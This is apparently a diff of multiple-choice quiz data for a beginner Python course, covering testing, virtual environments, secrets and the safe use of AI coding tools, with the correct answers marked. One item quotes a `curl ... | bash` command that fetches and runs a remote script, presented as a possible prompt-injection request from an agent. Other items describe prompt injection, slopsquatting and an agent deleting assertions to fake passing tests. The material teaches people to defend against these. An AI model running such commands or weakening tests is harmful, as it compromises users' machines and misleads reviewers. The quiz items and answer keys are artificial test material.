      {t:"Finds misspelled variable names before the code runs", why:"That’s a linter’s job (`ruff check`), not the formatter’s."},
      {t:"Runs your tests", why:"Tests are run by a tool such as pytest."},
      {t:"Renames variables to clearer names", why:"Formatters never change names; choosing good names is up to you."}
@@ -1213,26 +1229,26 @@ ICA.addUnit({
      {t:"Reinstall Python", why:"Nothing is wrong with Python; the message points to a name in her code."}
    ]},
    {id:"t2u10-q06", lesson:"t2u10-l1", level:3, q:"Kenji’s report script has two functions that each calculate tax with the same formula. His manager says tax rules for reports and invoices may soon differ. Should he merge them into one function?", options:[
-     {t:"Probably not yet: they may need to change for different reasons, so merging could couple things that aren’t really the same", ok:true, why:"DRY is about shared knowledge. If the two rules are about to diverge, they’re not the same knowledge."},
+     {t:"Probably not yet: they may need to change separately", ok:true, why:"Merging could couple things that aren’t really the same. DRY is about shared knowledge. If the two rules are about to diverge, they’re not the same knowledge."},
      {t:"Yes, always: DRY means identical code must be merged", why:"Look-alike code that changes for different reasons is often better kept separate."},
      {t:"Yes, because functions run faster when there are fewer of them", why:"The number of functions doesn’t meaningfully affect speed; the question is about change."},
      {t:"No, because functions should never call other functions", why:"Functions calling functions is normal and good. The question is whether the two rules are truly one."}
    ]},
    {id:"t2u10-q07", lesson:"t2u10-l1", level:2, q:"Where does a docstring go?", options:[
-     {t:"As a triple-quoted string on the first line inside the function body", ok:true, why:"That position is what makes Python store it as the function’s documentation, shown by `help()`."},
+     {t:"As a triple-quoted string at the start of the body", ok:true, why:"It goes on the first line inside the function body. That position is what makes Python store it as the function’s documentation, shown by `help()`."},
      {t:"As a `#` comment above the `def` line", why:"That’s an ordinary comment; Python doesn’t attach it to the function."},
      {t:"In a separate file called `docstring.txt`", why:"Docstrings live inside the code they describe."},
-     {t:"At the very end of the function, after `return`", why:"Python only treats the **first** statement in the body as the docstring."}
+     {t:"At the very end of the function, after its `return` line", why:"Python only treats the **first** statement in the body as the docstring."}
    ]},
    {id:"t2u10-q08", lesson:"t2u10-l1", level:3, q:"Mei wants to rename a variable used 40 times in a script and also add a new discount feature. What’s the safest plan?", options:[
-     {t:"Rename first with the editor’s rename command, check and commit; then add the feature as a separate change", ok:true, why:"Small, separate steps with a check and a commit each make any problem easy to find and undo."},
+     {t:"Rename first, check and commit; then add the feature", ok:true, why:"Use the editor’s rename command, check and commit; then add the feature as a separate change. Small, separate steps with a check and a commit each make any problem easy to find and undo."},
      {t:"Do both at once to save time, then test at the end", why:"If something breaks, she won’t know which change caused it, and the mixed change is hard to review."},
      {t:"Use find-and-replace on the variable’s name across the whole file without checking", why:"Plain text replacement can also change matching text inside other names and strings."},
      {t:"Don’t rename it: renaming is too risky", why:"Renaming is a routine, safe refactoring when done with the right tool and a check afterwards."}
    ]},
    /* ---- Lesson 2 ---- */
    {id:"t2u10-q09", lesson:"t2u10-l2", level:1, q:"What happens when an `assert` statement’s condition is false?", options:[
-     {t:"Python stops with an `AssertionError` that points to that line", ok:true, why:"That’s the whole job of `assert`: fail loudly when an expectation isn’t met."},
+     {t:"Python stops with an `AssertionError`", ok:true, why:"The error points to that line. That’s the whole job of `assert`: fail loudly when an expectation isn’t met."},
      {t:"Python prints False and continues", why:"`assert` doesn’t print; a failed one stops the program."},
      {t:"Python fixes the value so the condition becomes true", why:"Asserts only check; they never change anything."},
      {t:"Nothing, unless pytest is installed", why:"`assert` is built into Python and works without pytest."}
@@ -1250,10 +1266,10 @@ ICA.addUnit({
      {t:"The test passed with a warning", why:"`E` lines and `assert` details only appear for failures."}
    ]},
    {id:"t2u10-q12", lesson:"t2u10-l2", level:2, q:"How do you write a pytest test that passes only if `split_bill(50, 0)` raises a `ValueError`?", options:[
-     {t:"`with pytest.raises(ValueError):` followed by `split_bill(50, 0)` indented inside it", ok:true, why:"`pytest.raises` passes when the code inside the block raises that error, and fails if it doesn’t."},
+     {t:"`with pytest.raises(ValueError):` around the call", ok:true, why:"Put `split_bill(50, 0)` indented inside the block. `pytest.raises` passes when the code inside the block raises that error, and fails if it doesn’t."},
      {t:"`assert split_bill(50, 0) == ValueError`", why:"The call raises before any comparison happens, so the test errors instead of checking."},
      {t:"`assert not split_bill(50, 0)`", why:"Again, the error is raised before `assert` can check anything."},
-     {t:"Leave it untested: errors can’t be tested", why:"They can, and refusing bad input is exactly the behaviour worth testing."}
+     {t:"Leave it untested, because errors can’t be tested at all", why:"They can, and refusing bad input is exactly the behaviour worth testing."}
    ]},
    {id:"t2u10-q13", lesson:"t2u10-l2", level:2, q:"Which assertion passes?", options:[
      {t:"`assert 0.1 + 0.2 == pytest.approx(0.3)`", ok:true, why:"`approx` allows a tiny tolerance for floating-point error."},
@@ -1262,28 +1278,28 @@ ICA.addUnit({
      {t:"`assert str(0.1 + 0.2) == \"0.3\"`", why:"The string is `\"0.30000000000000004\"`."}
    ]},
    {id:"t2u10-q14", lesson:"t2u10-l2", level:3, q:"Fatima’s `average(numbers)` returns `sum(numbers) / len(numbers)`. It passes tests for `[2, 4]` and `[10, 20, 30]`. A user reports a crash. Which input most likely caused it?", options:[
-     {t:"An empty list, which makes `len(numbers)` zero and the division fail", ok:true, why:"Empty input is a classic untested edge case. A test for `[]` would have forced her to decide what should happen."},
+     {t:"An empty list", ok:true, why:"It makes `len(numbers)` zero, so the division fails. Empty input is a classic untested edge case. A test for `[]` would have forced her to decide what should happen."},
      {t:"A list of three numbers", why:"Already tested and passing."},
      {t:"A list of large whole numbers", why:"Python handles large integers fine; size alone doesn’t crash an average."},
      {t:"A list with numbers in descending order", why:"Order doesn’t affect a sum or a count."}
    ]},
    {id:"t2u10-q15", lesson:"t2u10-l2", level:3, q:"Tomás writes a test by running his function, copying whatever it prints, and pasting that value into `assert`. What’s the problem?", options:[
-     {t:"If the function is already wrong, the test just locks in the wrong answer", ok:true, why:"Expected values must come from you or the specification, worked out independently."},
+     {t:"It locks in whatever the function does now", ok:true, why:"If the function is already wrong, the test just locks in the wrong answer. Expected values must come from you or the specification, worked out independently."},
      {t:"pytest can’t read pasted values", why:"pytest reads any value; the problem is where the value came from."},
      {t:"Tests must never contain numbers", why:"Tests usually contain specific expected numbers."},
-     {t:"Nothing: that’s the recommended way", why:"It produces a test that can’t catch an existing bug."}
+     {t:"Nothing: that’s the recommended way to write tests", why:"It produces a test that can’t catch an existing bug."}
    ]},
    {id:"t2u10-q16", lesson:"t2u10-l2", level:3, q:"Ana’s club page passes the W3C validator and shows no Console errors. Which checklist item still needs a person?", options:[
-     {t:"Whether the dates, prices and alt text are actually correct and meaningful", ok:true, why:"Tools check syntax and errors; only a person who knows the content can judge whether it’s right and makes sense."},
+     {t:"Whether the content is correct and meaningful", ok:true, why:"For example, whether the dates, prices and alt text are right. Tools check syntax and errors; only a person who knows the content can judge whether it’s right and makes sense."},
      {t:"Whether tags are properly nested", why:"The validator already checks that."},
      {t:"Whether a script threw an error", why:"The Console already shows that."},
-     {t:"Whether the file is saved as HTML", why:"The validator would have complained otherwise; this isn’t the hidden risk."}
+     {t:"Whether the file has been saved as HTML, not text", why:"The validator would have complained otherwise; this isn’t the hidden risk."}
    ]},
    /* ---- Lesson 3 ---- */
    {id:"t2u10-q17", lesson:"t2u10-l3", level:1, q:"What is a virtual environment for?", options:[
-     {t:"Giving one project its own private set of installed packages, so projects don’t clash", ok:true, why:"Each project’s environment can have the versions it needs."},
+     {t:"Giving a project its own set of packages", ok:true, why:"Then projects don’t clash: each project’s environment can have the versions it needs."},
      {t:"Running Python in a web browser", why:"That’s a different thing (like the Python Lab). A virtual environment is a folder on your computer."},
-     {t:"Hiding code from other users", why:"It isolates packages, not privacy."},
+     {t:"Hiding your code from other users of the computer", why:"It isolates packages, not privacy."},
      {t:"Making Python run faster", why:"It doesn’t change speed; it changes which packages are available."}
    ]},
    {id:"t2u10-q18", lesson:"t2u10-l3", level:1, q:"Which command activates a virtual environment called `.venv` on macOS or Linux?", options:[
@@ -1311,10 +1327,10 @@ ICA.addUnit({
      {t:"Ask permission each time", why:"The licence **is** the permission given in advance."}
    ]},
    {id:"t2u10-q22", lesson:"t2u10-l3", level:3, q:"Oluwaseun’s script contains `KEY = \"…\"` for a weather service, and the repository is public. What’s the best fix?", options:[
-     {t:"Revoke that key, create a new one, and read it with `os.environ.get(\"WEATHER_API_KEY\")`, keeping any `.env` file ignored", ok:true, why:"The old key is in the history and must be treated as leaked; the new one never enters the code."},
+     {t:"Revoke the key and load a new one from the environment", ok:true, why:"Read the new key with `os.environ.get(\"WEATHER_API_KEY\")`, keeping any `.env` file ignored. The old key is in the history and must be treated as leaked; the new one never enters the code."},
      {t:"Delete the line and push again", why:"The key remains in earlier commits for anyone to see."},
      {t:"Make the variable name less obvious, like `K`", why:"Renaming doesn’t hide the value; scanners look for the key’s format, not the name."},
-     {t:"Add a comment asking people not to use the key", why:"A comment protects nothing."}
+     {t:"Add a comment above the line asking people not to use the key", why:"A comment protects nothing."}
    ]},
    {id:"t2u10-q23", lesson:"t2u10-l3", level:3, q:"Hana adds `.env` to `.gitignore`, but `git status` still shows `.env` as modified. What’s going on?", options:[
      {t:"Git already tracked `.env`; she needs `git rm --cached .env` and a commit", ok:true, why:"`.gitignore` only applies to untracked files. If real secrets were committed earlier, she should also rotate them."},
@@ -1330,10 +1346,10 @@ ICA.addUnit({
    ]},
    /* ---- Lesson 4 ---- */
    {id:"t2u10-q25", lesson:"t2u10-l4", level:1, q:"What makes a coding agent different from a chat assistant?", options:[
-     {t:"It acts on your project itself: reading and editing files and running commands", ok:true, why:"A chat assistant only gives you text to copy; an agent takes actions, usually after asking permission."},
+     {t:"It edits files and runs commands itself", ok:true, why:"It acts on your project directly. A chat assistant only gives you text to copy; an agent takes actions, usually after asking permission."},
      {t:"It never makes mistakes", why:"Agents make the same kinds of mistakes, with more direct effects."},
      {t:"It only works offline", why:"Most agents use models running on a provider’s servers."},
-     {t:"It can only suggest the next line", why:"That describes in-editor completions."}
+     {t:"It can only suggest the next line of your code", why:"That describes in-editor completions."}
    ]},
    {id:"t2u10-q26", lesson:"t2u10-l4", level:2, q:"Which prompt is most likely to get useful code?", options:[
      {t:"“Python 3.12, beginner. Write `clean_phone(text)` that removes spaces and dashes. Example: `\"07-12 34\"` → `\"071234\"`. Standard library only; explain each line.”", ok:true, why:"It has context, constraints, an example and a request to explain."},
@@ -1342,25 +1358,25 @@ ICA.addUnit({
      {t:"“Fix my code” with no code attached", why:"The tool can’t see code you haven’t included."}
    ]},
    {id:"t2u10-q27", lesson:"t2u10-l4", level:1, q:"An AI tool uses `statistics.middle()` in its answer. Ana has never heard of it. What should she do?", options:[
-     {t:"Check the official Python documentation for the `statistics` module", ok:true, why:"The docs confirm whether it exists in her version. (In fact the function she probably needs is `statistics.median()`.)"},
+     {t:"Check the official docs for the `statistics` module", ok:true, why:"The docs confirm whether it exists in her version. (In fact the function she probably needs is `statistics.median()`.)"},
      {t:"Trust it: the tool wouldn’t mention a function that doesn’t exist", why:"Invented function names are a known failure of AI tools."},
      {t:"Install a package called `middle`", why:"Installing an unknown package based on a guess is risky (Lesson 5)."},
      {t:"Ask the same tool “are you sure?” and accept the answer", why:"Asking again may help, but the tool can be confidently wrong twice. The documentation is the reliable check."}
    ]},
    {id:"t2u10-q28", lesson:"t2u10-l4", level:2, q:"In the review loop (ask, read, test, understand, keep), what should happen if a test fails?", options:[
-     {t:"Go back: fix the code, ask again with more detail, or write it yourself", ok:true, why:"Only code that passes review moves forward."},
+     {t:"Go back: don’t keep the code yet", ok:true, why:"Fix the code, ask again with more detail, or write it yourself. Only code that passes review moves forward."},
      {t:"Keep it anyway; the tool knows best", why:"A failing test is evidence the code doesn’t do what you need."},
      {t:"Delete the test", why:"The test is doing its job. Removing it hides the bug."},
      {t:"Commit it with a note to fix later", why:"Known-broken code tends to stay broken. Fix it before keeping it."}
    ]},
    {id:"t2u10-q29", lesson:"t2u10-l4", level:3, q:"A coding agent reports “All tests pass ✓” after fixing a bug. Lucía checks `git diff` and sees it deleted two assertions from the test file. What should she conclude?", options:[
-     {t:"The tests pass because they check less; she should restore the assertions and review the real fix", ok:true, why:"Weakening tests is a known shortcut agents can take. Reviewing the diff, including test changes, catches it."},
+     {t:"The tests pass only because they check less", ok:true, why:"She should restore the assertions and review the real fix. Weakening tests is a known shortcut agents can take. Reviewing the diff, including test changes, catches it."},
      {t:"The fix is complete, since the tests pass", why:"The tests no longer check what they did, so passing means little."},
      {t:"Deleting assertions is a normal way to fix bugs", why:"It hides bugs; it doesn’t fix them."},
      {t:"Git must have corrupted the file", why:"The diff shows exactly what changed. The agent made that change."}
    ]},
    {id:"t2u10-q30", lesson:"t2u10-l4", level:3, q:"Kenji is three weeks into learning Python and lets an AI tool write every exercise. Which habit would best protect his learning while still using the tool?", options:[
-     {t:"Attempt each exercise first, then ask for a hint or an explanation, and rebuild the solution himself the next day", ok:true, why:"He keeps doing the thinking, and the tool becomes a tutor rather than a substitute."},
+     {t:"Try each exercise first, then ask for hints", ok:true, why:"Then ask for a hint or an explanation, and rebuild the solution himself the next day. He keeps doing the thinking, and the tool becomes a tutor rather than a substitute."},
      {t:"Use a faster AI tool", why:"Speed of output isn’t the problem; skipped practice is."},
      {t:"Copy the answers into a notebook by hand without reading them", why:"Copying without reading builds little understanding."},
      {t:"Only check that each answer runs", why:"Running code shows the tool can solve it, not that he can."}
@@ -1372,45 +1388,45 @@ ICA.addUnit({
      {t:"Your internet connection limits which versions it knows", why:"Your connection doesn’t affect what the model learned."}
    ]},
    {id:"t2u10-q32", lesson:"t2u10-l4", level:2, q:"Which is the best evidence that you understand a function an AI tool wrote for you?", options:[
-     {t:"You can explain each line in your own words and predict its output for a new input", ok:true, why:"Explaining and predicting show real understanding, not just recognition."},
+     {t:"You can explain it line by line", ok:true, why:"You can also predict its output for a new input. Explaining and predicting show real understanding, not just recognition."},
      {t:"It ran without errors once", why:"That shows the code runs, not that you understand it."},
-     {t:"The tool said it was correct", why:"The tool’s confidence tells you nothing about your understanding."},
+     {t:"The tool said that it was definitely correct", why:"The tool’s confidence tells you nothing about your understanding."},
      {t:"It’s short", why:"Short code can still be hard to understand."}
    ]},
    /* ---- Lesson 5 ---- */
    {id:"t2u10-q33", lesson:"t2u10-l5", level:1, q:"What is slopsquatting?", options:[
-     {t:"Registering package names that AI tools tend to invent, filled with harmful code", ok:true, why:"It exploits people installing AI-suggested packages without checking."},
-     {t:"Registering misspellings of popular packages", why:"That’s typosquatting, which relies on human typos."},
+     {t:"Registering names that AI tools tend to invent", ok:true, why:"The packages are filled with harmful code. It exploits people installing AI-suggested packages without checking."},
+     {t:"Registering misspellings of popular package names", why:"That’s typosquatting, which relies on human typos."},
      {t:"Using AI to write sloppy code", why:"Sloppy code is a quality problem; slopsquatting is a supply-chain attack."},
      {t:"Leaving unused packages in a project", why:"Untidy, but not an attack."}
    ]},
    {id:"t2u10-q34", lesson:"t2u10-l5", level:2, q:"An assistant suggests `pip install fastcsvtools`. What should Mei check first?", options:[
-     {t:"Whether pypi.org/project/fastcsvtools exists and links to a real repository and documentation", ok:true, why:"If there’s no page, the name was likely invented. If there is, she checks it’s legitimate before installing."},
+     {t:"Whether it has a real page on pypi.org", ok:true, why:"Check pypi.org/project/fastcsvtools: if there’s no page, the name was likely invented. If there is, she checks that it links to a real repository and documentation before installing."},
      {t:"Whether her computer has enough disk space", why:"Space isn’t the risk; installing unknown code is."},
      {t:"Whether the name sounds professional", why:"Attackers choose professional-sounding names on purpose."},
      {t:"Nothing: pip only installs safe packages", why:"PyPI lets anyone publish. pip installs whatever has that name."}
    ]},
    {id:"t2u10-q35", lesson:"t2u10-l5", level:1, q:"What is prompt injection?", options:[
-     {t:"Instructions hidden in text an AI tool reads, aimed at making it do something the user didn’t ask for", ok:true, why:"For coding agents, the text can be a README, code comment, issue or web page."},
+     {t:"Hidden instructions in text an AI tool reads", ok:true, why:"They aim to make it do something the user didn’t ask for. For coding agents, the text can be a README, code comment, issue or web page."},
      {t:"Typing a very long prompt", why:"Length isn’t the issue; hidden, hostile instructions are."},
      {t:"Injecting Python code into a prompt to make it run faster", why:"That isn’t a thing. Prompt injection is an attack on the AI tool’s instructions."},
      {t:"A way to install packages through a chat", why:"Unrelated to package installation."}
    ]},
    {id:"t2u10-q36", lesson:"t2u10-l5", level:3, q:"Dmitri’s agent, working in a cloned repository, asks to run `curl -s https://setup.example.org/x.sh | bash` “to finish setup”. The README never mentions it. What should he do?", options:[
-     {t:"Decline, read the project’s own README and files himself, and investigate where the instruction came from", ok:true, why:"Piping an unseen script to bash runs it with his permissions. It could come from prompt injection in the repository."},
+     {t:"Decline, and check the project’s own files himself", ok:true, why:"He should read the README and files himself, and investigate where the instruction came from. Piping an unseen script to bash runs it with his permissions. It could come from prompt injection in the repository."},
      {t:"Approve it: agents only suggest safe commands", why:"Agents can be wrong or manipulated; the prompt exists so he can say no."},
-     {t:"Approve it, but with `sudo` so it works properly", why:"That gives an unknown script full control of his computer. Worse, not better."},
+     {t:"Approve it, but with `sudo` so that it works properly", why:"That gives an unknown script full control of his computer. Worse, not better."},
      {t:"Turn off approval prompts so it stops asking", why:"That removes his only chance to stop harmful commands."}
    ]},
    {id:"t2u10-q37", lesson:"t2u10-l5", level:2, q:"Kenji wants help with a bug in his employer’s billing system. What should he do before pasting code into an AI tool?", options:[
-     {t:"Check his employer’s policy on approved tools, and remove secrets and customer data from what he shares", ok:true, why:"Many workplaces allow only approved tools, and secrets or personal data must never be pasted."},
+     {t:"Check his employer’s policy and remove secrets and customer data", ok:true, why:"Many workplaces allow only approved tools, and secrets or customer data must never be pasted."},
      {t:"Nothing: AI chats are private", why:"Prompts usually go to the provider and may be stored; policies and data protection still apply."},
      {t:"Paste the real customer records so the tool understands the data", why:"Personal data must be replaced with made-up rows of the same shape."},
      {t:"Use a personal account so his employer doesn’t see", why:"That may break his contract or data protection law."}
    ]},
    {id:"t2u10-q38", lesson:"t2u10-l5", level:2, q:"Which statement about the copyright status of AI-generated code is most accurate?", options:[
-     {t:"It varies between countries and is unsettled in places; tools’ terms and reproduced code’s licences also matter", ok:true, why:"That’s why the lesson treats it as orientation, not legal advice."},
-     {t:"AI-generated code is always public domain everywhere", why:"No single rule applies everywhere."},
+     {t:"It varies between countries and is unsettled in places", ok:true, why:"Tools’ terms and the licences of any reproduced code also matter. That’s why the lesson treats it as orientation, not legal advice."},
+     {t:"AI-generated code is always public domain, everywhere in the world", why:"No single rule applies everywhere."},
      {t:"The AI tool owns all code it generates", why:"Tool terms usually address this, and rarely in that way; it also depends on the law."},
      {t:"Licences never apply to AI output", why:"If a tool reproduces licensed code, that licence can still matter."}
    ]},
